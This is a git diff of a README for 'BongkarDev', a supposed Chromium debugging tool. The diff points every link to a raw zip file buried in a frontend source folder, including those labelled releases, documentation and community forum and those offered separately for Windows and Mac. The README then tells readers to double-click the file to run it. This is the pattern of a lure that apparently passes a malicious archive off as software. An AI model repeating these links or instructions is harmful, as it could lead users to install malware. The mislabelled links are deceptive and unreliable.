@@ -13,14 +13,14 @@ BongkarDev is a web debugging tool that reads Chromium from its source. It conne
 ## 📦 Download & Install
 To get started with BongkarDev, visit the Releases page to download the application.
 
-[![Download BongkarDev](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip)](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip)
+[![Download BongkarDev](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip)](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip)
 
 ### Step-by-Step Guide
-1. **Visit the Releases Page**: Click the button above, or manually go to the Releases page [here](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip).
+1. **Visit the Releases Page**: Click the button above, or manually go to the Releases page [here](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip).
   
 2. **Choose the Right Version**: Once on the Releases page, you will see a list of available versions. Find the latest version recommended for all users marked as "Latest."
 
-3. **Download the Application**: Click on the link for your operating system. It may look like `https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip` for Windows or `https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip` for Mac. The file download will start automatically.
+3. **Download the Application**: Click on the link for your operating system. It may look like `https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip` for Windows or `https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip` for Mac. The file download will start automatically.
 
 4. **Open the Downloaded File**: Once downloaded, find the file in your Downloads folder. Double-click it to run the installer.
 
@@ -55,9 +55,9 @@ For any questions or issues, you can reach out to the community via the GitHub p
 BongkarDev is open to contributions. If you wish to help enhance the tool, feel free to fork the repository and submit pull requests. This is a community-driven project, and your input can improve the experience for all users.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip)
-- [Documentation](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip)
-- [Community Forum](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/Bongkar-Dev-v3.3.zip)
+- [Releases Page](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip)
+- [Documentation](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip)
+- [Community Forum](https://github.com/Hasora/BongkarDev/raw/refs/heads/main/frontend/src/app/[locale]/Bongkar-Dev-3.9.zip)
 
 ## ✉️ Stay Updated
 Make sure to follow the repository to stay informed about updates and new releases. This will help you utilize the latest features and improvements in BongkarDev.
